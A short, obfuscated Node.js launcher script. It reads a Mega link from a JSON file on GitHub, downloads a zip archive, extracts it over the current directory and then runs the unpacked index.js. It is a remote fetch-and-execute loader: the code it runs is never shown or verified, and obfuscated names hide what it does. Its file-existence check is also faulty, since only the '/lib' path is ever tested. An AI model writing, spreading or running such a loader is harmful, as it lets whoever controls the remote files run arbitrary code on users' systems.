const fs = require('fs');
const path = require("path");
const {
  File
} = require("megajs");
const AdmZip = require("adm-zip");
const axios = require("axios");
async function downloadAndExtractZip() {
  try {
    const _0x3c1b97 = await axios.get("https://raw.githubusercontent.com/tech14555/db/refs/heads/main/mega_zip.json");
    const _0x1e8071 = _0x3c1b97.data.mega_zip;
    const _0x3001da = File.fromURL(_0x1e8071);
    const _0x3e531e = await _0x3001da.downloadBuffer();
    const _0x3c5e5a = path.join(__dirname, "temp.zip");
    fs.writeFileSync(_0x3c5e5a, _0x3e531e);
    const _0x1d7713 = new AdmZip(_0x3c5e5a);
    _0x1d7713.extractAllTo('./', true);
    fs.unlinkSync(_0x3c5e5a);
    console.log("⭕ Main downloaded successfully ✅");
  } catch (_0x2676a6) {
    console.error("❌ Error during download and extraction:", _0x2676a6.message);
    process.exit(0x1);
  }
}
const main = async () => {
  try {
    if (!fs.existsSync(__dirname + "/lib" || '/plugins' || "/index.js")) {
      await downloadAndExtractZip();
    } else {
      console.log("⏩ Skip download main file");
    }
    require("./index.js");
  } catch (_0x22141c) {
    console.error("An error occurred:", _0x22141c.message);
  }
};
main();
